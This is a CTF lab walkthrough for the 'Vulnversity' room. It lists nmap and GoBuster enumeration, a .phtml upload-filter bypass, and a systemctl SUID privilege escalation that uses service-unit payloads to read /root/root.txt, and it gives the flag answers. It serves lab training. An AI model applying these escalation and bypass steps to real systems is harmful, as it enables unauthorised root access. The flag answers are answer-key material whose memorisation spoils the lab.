#Vulnversity

`export IP=10.10.212.126`

##Reconnaissance 
nmap flag			Description
`-sV`				Attempts to determine the version of the services running
`-p <x> or -p-`		Port scan for port <x> or scan all ports
`-Pn`				Disable host discovery and just scan for open ports
`-A`				Enables OS and version detection, executes in-build scripts for further enumeration 
`-sC`				Scan with the default nmap scripts
`-v`				Verbose mode
`-sU`				UDP port scan
`-sS`				TCP SYN port scan

###nmap scan
`nmap -sC -sV -oN nmap/initial $IP -v`

2) 	
Scan the box, how many ports are open?
`6`

3) 	
What version of the squid proxy is running on the machine?
`3.5.12`

4) 	
How many ports will nmap scan if the flag -p-400 was used?
`400`

5) 	
Using the nmap flag -n what will it not resolve?
`DNS`

6) 	
What is the most likely operating system this machine is running?
`Ubuntu`

7) 	
What port is the web server running on?
`3333`

8)
`nmap -p- -sC -sV -oN nmap/fullscan $IP -v`

##GoBuster

find many wordlists under /usr/share/wordlists.
Now lets run GoBuster with a wordlist: `gobuster dir -u http://<ip>:3333 -w <word list location>`

GoBuster flag			Description
`-e`					Print the full URLs in your console
`-u`					The target URL
`-w`					Path to your wordlist
`-U and -P`				Username and Password for Basic Auth
`-p <x>`				Proxy to use for requests
`-c <http cookies>`		Specify a cookie for simulating your auth

`gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > gobuster/sitescan`
 	

What is the directory that has an upload form page?
`/internal/`

##Compromise the webserver 
1)
Try upload a few file types to the server, what common extension seems to be blocked?
`php`

3)
what extension is allowed?
![Burp Reuslts](images/Burp_output.png)
Format: ![Alt Text](images/Burp_output.png)
`.phtml`

5)
What is the name of the user who manages the webserver? `ps-aux`
`bill`

6)
What is the user flag?
`8bd7992fbe8a6ad22a63361004cfcedb`

##Privilege Escalation
`find / -pem 400 2>dev/null | grep -v "permission denied"`

1)
What file stands out?
`/bin/systemctl`

searching GTFO bins gtfobins.github.io for systemctl errors you get the following

2) 	
Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
Become root and get the last flag (/root/root.txt)

`
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
`

`
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
`

`a58ff8579f0a9270368d33a9966c7fd5`